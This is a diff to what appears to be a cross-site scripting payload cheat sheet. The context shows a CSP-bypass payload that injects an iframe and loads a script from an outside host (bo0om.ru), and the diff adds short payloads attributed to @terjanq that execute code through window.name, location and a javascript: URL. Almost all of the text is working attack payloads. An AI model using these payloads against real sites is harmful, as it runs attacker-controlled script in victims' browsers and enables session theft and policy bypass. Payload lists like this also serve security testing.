@@ -187,6 +187,14 @@ CSP BYPASS:
 
 <script>f=document.createElement("iframe");f.id="pwn";f.src="/robots.txt";f.onload=()=>{x=document.createElement('script');x.src='//bo0om.ru/csp.js';pwn.contentWindow.document.body.appendChild(x)};document.body.appendChild(f);</script>
 
+By @terjanq
+
+location=name+/\2130706433/
+location=name||/\2130706433/
+
+window.name = 'javascript:alert("terjanq");//'
+location = document.referrer;
+
 
 POLYGLOT:
 
